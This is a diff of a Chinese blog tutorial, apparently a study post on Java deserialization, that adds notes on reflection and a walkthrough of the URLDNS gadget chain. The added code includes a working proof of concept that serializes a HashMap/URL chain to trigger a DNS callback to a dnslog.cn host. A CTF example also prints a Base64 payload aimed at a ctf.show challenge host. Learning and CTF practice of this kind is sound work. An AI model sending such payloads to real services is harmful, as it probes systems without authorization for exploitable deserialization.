@@ -28,8 +28,15 @@
 <meta property="og:description" content="认真写">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/10/05/80e1c006911a108c.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/10/11/a1fc5b9d2a31b541.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/10/11/64590666b0bd646a.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/10/11/61f192fe68fcb22f.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/10/11/e8d2f8603bd54694.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/10/11/a7497b49e97087f1.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/10/11/3694b1100a74f071.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/10/11/3d267520d169e20b.png">
 <meta property="article:published_time" content="2023-10-02T12:29:51.000Z">
-<meta property="article:modified_time" content="2023-10-08T13:03:20.379Z">
+<meta property="article:modified_time" content="2023-10-11T09:56:57.034Z">
 <meta property="article:author" content="小zhou">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://s3.bmp.ovh/imgs/2023/10/05/80e1c006911a108c.png">
@@ -225,7 +232,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-10-08 21:03:20" itemprop="dateModified" datetime="2023-10-08T21:03:20+08:00">2023-10-08</time>
+                <time title="修改时间：2023-10-11 17:56:57" itemprop="dateModified" datetime="2023-10-11T17:56:57+08:00">2023-10-11</time>
               </span>
 
           <br>
@@ -234,14 +241,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2k</span>
+              <span>3.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>7 分钟</span>
+              <span>11 分钟</span>
             </span>
 
         </div>
@@ -296,11 +303,32 @@
 <p>反射</p>
 <p>反射就是，一开始并不知道我们要初始化的类的对象是什么，自然也无法使用new 关键字来创建对象了。</p>
 <p>反射的作用：让java具有动态性</p>
+<p><strong>1.第一阶段：代码阶段&#x2F;编译阶段</strong></p>
+<p>最开始学习java时，我们都会创建一个.java后缀的文件，然后在里面写上我们的代码。运行前通过javac对其进行编译，得到一个.class后缀的字节码文件</p>
+<p><strong>2.第二阶段：类加载阶段（Class类阶段）</strong></p>
+<p>当执行new一个对象时，会先通过类加载器ClassLoader将我们所需要的类进行加载（此处就体现了反射），这里的类加载是以.class后缀文件为基础的。加载完后，在堆中会产生一个Class类型的对象（一个类只有一个Class对象），这个对象包含了类的完整结构信息（成员变量、构造器、成员方法等），通过这个对象得到类的结构。（Class对象就像是一面镜子，透过这个镜子看到类的结构，故形象的称之为反射）</p>
+<p><strong>3.第三阶段：Runtime运行阶段</strong></p>
+<p>在运行阶段，我们通过new的方式创建的对象是在堆中，该对象知道它是属于哪个Class对象。若我们得到Class对象，也同样可以通过它来创建对象，调用对象方法，操作属性等。</p>
+<p>java中与反射相关的类主要有四个：</p>
+<ol>
+<li><p><strong>java.lang.Class</strong></p>
+<p>代表一个类，Class对象表示某个类加载后在堆中的对象</p>
+</li>
+<li><p><strong>java.lang.reflect.Method</strong></p>
+<p>代表类的方法，Method对象表示某个类的方法</p>
+</li>
+<li><p><strong>java.lang.reflect.Field</strong></p>
+<p>代表类的成员变量，Field对象表示某个类的成员变量</p>
+</li>
+<li><p><strong>java.lang.reflect.Constructor</strong></p>
+<p>代表类的构造方法，Constructor对象表示构造器</p>
+</li>
+</ol>
 <p><strong>修改已有对象的属性， 动态生成对象，动态调用方法，操作内部类和私有方法。</strong></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line">        Field[] personfields= c.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f:personfields)</span><br><span class="line">        &#123;</span><br><span class="line">         System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
-
+<p><strong>1.Class类对象不是new出来的，而是系统创建的</strong></p>
+<p>在类加载时，通过类加载器ClassLoader的loadClass方法得到该类的Class对象</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line"><span class="comment">/*        Field[] personfields= c.getFields();</span></span><br><span class="line"><span class="comment">        for(Field f:personfields)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">         System.out.println(f);</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        Field namefield=c.getField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        namefield.set(p,<span class="number">25</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s3.bmp.ovh/imgs/2023/10/05/80e1c006911a108c.png"></p>
@@ -342,6 +370,33 @@
 <p>readObject&gt;反序列化自动执行，invoke&gt;有函数调用，</p>
 <p>拼接两条链，任意变固定</p>
 <p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8ccdbe00ff06">Java代理（Proxy）模式 - 简书 (jianshu.com)</a></p>
+<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p> URLDNS是JAVA复杂的反序列化链中最简单的一条，它不是一条真正意义上的“利⽤链”。因为它所能产生的结果不是命令执⾏，⽽是⼀次DNS请求。它使⽤Java内置的类构造，对第三⽅库没有依赖，对JDK版本没有要求，且其结果是发起一次DNS请求，不管目标有无回显，都⾮常适合用来检测是否存在反序列化漏洞</p>
+<p>对链子进行分析</p>
+<p>代码中最重要的三个类是HashMap,URL,URLStreamHandler。其中HashMap重写了readObject方法，URL类是里面有个hashCode()方法被HashMap的readObject()调用了，URLStreamHandler类是里面的getHostAddress被URL类里面的hashCode()方法调用</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/a1fc5b9d2a31b541.png"></p>
+<p>在HashMap 中存在反序列化接口在该类的readObject方法的最后一行</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/64590666b0bd646a.png"></p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/61f192fe68fcb22f.png"></p>
+<p>发现传入了一个Object类型的key，如果key为空，返回0，</p>
+<p>返回 调用传入类key的hashCode 方法，而且URL类中也有URL类中含有hashCode()方法，所以是可以控制的</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/e8d2f8603bd54694.png"></p>
+<p>这里说hashCode !&#x3D; -1，则直接返回hashCode，而该URL类的hashCode值被默认定义成了-1。如果等于-1，则继续往下走，我们继续跟进hashCode(this)方法</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/a7497b49e97087f1.png"></p>
+<p>再跟进getHostAddress方法</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/3694b1100a74f071.png">接着跟进</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/3d267520d169e20b.png"></p>
+<p>判断是否为空，最后执行InetAddress.getByName(host)获取目标ip地址，其实在网络中就是一次DNS请求</p>
+<p>最后理一遍思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap.java</span><br><span class="line">hashMap-&gt;readObject(),最后一行中调用hash(key)</span><br><span class="line">hashMap-&gt;hash(),key不为空，调用key.hashCode(),</span><br><span class="line">URL.java</span><br><span class="line">URL-&gt;hashCode(),hashCode的初始值为-1，若不为-1，返回 handler.hashCode(this);</span><br><span class="line">==&gt;URLStreamHandler.hashCode,进入getHostAddress(u),</span><br><span class="line">进入URLStreamHandler.getHostAddress，返还u.getHostAddress();即URL-&gt;getHostAddress()</span><br><span class="line">hostAddress = InetAddress.getByName(host);</span><br><span class="line">发起dns 请求</span><br></pre></td></tr></table></figure>
+
+<p>构链思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashmap=new Hashmap</span><br><span class="line">url=new URL</span><br><span class="line">反射修改url1的URL的hashCode的为1</span><br><span class="line">hashMap.put(url,&quot;test&quot;)</span><br><span class="line">修改URL的hashCode为回-1</span><br></pre></td></tr></table></figure>
+
+<p>poc 链如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> getObject(<span class="string">&quot;http://md8zyk.dnslog.cn&quot;</span>);</span><br><span class="line">        runReadobject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//这里不能发起请求，通过反射将url对象的hashcode改成不是一</span></span><br><span class="line">        filed.set(url1, <span class="number">123</span>);</span><br><span class="line">        <span class="comment">//同样这里需要通过反射改成一才能继续执行</span></span><br><span class="line">        hashMap.put(url1, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        filed.set(url1, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">runReadobject</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(outputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(outputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;  </span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">data</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line"><span class="type">ObjectOutput</span> <span class="variable">oos</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(data);  </span><br><span class="line">oos.writeObject(obj);  </span><br><span class="line">oos.flush();  </span><br><span class="line">oos.close();  </span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://28bc736c-f956-4721-8651-efc6e2beb94a.challenge.ctf.show/&quot;</span>);  </span><br><span class="line">Class&lt;?&gt; c=url.getClass();  </span><br><span class="line">Field hashcode=c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  </span><br><span class="line">hashcode.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">hashcode.set(url,<span class="number">1</span>);  </span><br><span class="line">HashMap&lt;URL,Integer&gt; h = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();  </span><br><span class="line">h.put(url,<span class="number">1</span>);  </span><br><span class="line">hashcode.set(url,-<span class="number">1</span>);  </span><br><span class="line">serialize(h);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -439,7 +494,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">反序列化基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#java-%E5%8F%8D%E5%B0%84"><span class="nav-number">2.</span> <span class="nav-text">java 反射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jdk%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">jdk静态代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-number">4.</span> <span class="nav-text">JDK动态代理</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">反序列化基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#java-%E5%8F%8D%E5%B0%84"><span class="nav-number">2.</span> <span class="nav-text">java 反射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jdk%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">jdk静态代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-number">4.</span> <span class="nav-text">JDK动态代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#URLDNS%E9%93%BE"><span class="nav-number">5.</span> <span class="nav-text">URLDNS链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">6.</span> <span class="nav-text">例题</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -504,12 +559,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">78k</span>
+    <span title="站点总字数">82k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:45</span>
+    <span title="站点阅读时长">4:58</span>
 </div>
 
 <!--
